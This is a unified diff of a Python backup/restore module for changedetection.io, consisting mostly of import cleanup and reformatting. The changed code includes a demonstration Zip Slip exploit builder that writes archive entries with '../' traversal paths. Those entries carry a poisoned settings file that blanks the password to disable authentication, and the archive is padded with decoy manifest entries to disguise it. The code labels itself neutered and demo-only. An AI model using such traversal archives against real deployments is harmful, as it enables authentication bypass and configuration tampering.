@@ -2,14 +2,12 @@
 # Handles import/export of watch configurations and application state.
 # Used by the admin panel at /backups/restore for disaster recovery workflows.
 
-import os
-import json
-import zipfile
-import logging
-import tempfile
 import hashlib
-from pathlib import Path
+import json
+import logging
+import zipfile
 from datetime import datetime
+from pathlib import Path
 
 logger = logging.getLogger(__name__)
 
@@ -173,6 +171,7 @@ class BackupManager:
 # (payload is neutered — writes only to /tmp and prints confirmation)
 # ------------------------------------------------------------------
 
+
 def _build_demo_zipslip_archive(output_path: str = "/tmp/zipslip_demo.zip") -> str:
     """
     Constructs a demonstration ZIP that exploits the Zip Slip path
@@ -186,20 +185,24 @@ def _build_demo_zipslip_archive(output_path: str = "/tmp/zipslip_demo.zip") -> s
     """
     demo_secret = "DEMO_PLACEHOLDER_TOKEN"
 
-    poisoned_settings = json.dumps({
-        "settings": {
-            "application": {
-                "password": "",        # blank = auth disabled
-                "secret_key": demo_secret,
+    poisoned_settings = json.dumps(
+        {
+            "settings": {
+                "application": {
+                    "password": "",  # blank = auth disabled
+                    "secret_key": demo_secret,
+                }
             }
         }
-    })
+    )
 
-    poisoned_watch = json.dumps({
-        "url": "https://example.com/zipslip-demo",
-        "title": "ZIPSLIP-DEMO (neutered)",
-        "notification_urls": ["https://example.org/notify-demo"],
-    })
+    poisoned_watch = json.dumps(
+        {
+            "url": "https://example.com/zipslip-demo",
+            "title": "ZIPSLIP-DEMO (neutered)",
+            "notification_urls": ["https://example.org/notify-demo"],
+        }
+    )
 
     with zipfile.ZipFile(output_path, "w", compression=zipfile.ZIP_DEFLATED) as zf:
         # Traversal sequences escape the intended extraction directory
@@ -208,12 +211,17 @@ def _build_demo_zipslip_archive(output_path: str = "/tmp/zipslip_demo.zip") -> s
         zf.writestr("../demo-uuid-0000/watch.json", poisoned_watch)
 
         # Legitimate-looking entries to disguise the archive
-        zf.writestr("manifest.json", json.dumps({
-            "app_name": "changedetection.io",
-            "version": "2.1",
-            "created_at": datetime.utcnow().isoformat(),
-            "watch_count": 1,
-        }))
+        zf.writestr(
+            "manifest.json",
+            json.dumps(
+                {
+                    "app_name": "changedetection.io",
+                    "version": "2.1",
+                    "created_at": datetime.utcnow().isoformat(),
+                    "watch_count": 1,
+                }
+            ),
+        )
 
     print(f"[demo] Malicious ZIP written to: {output_path}")
     print("[demo] Members with path traversal:")
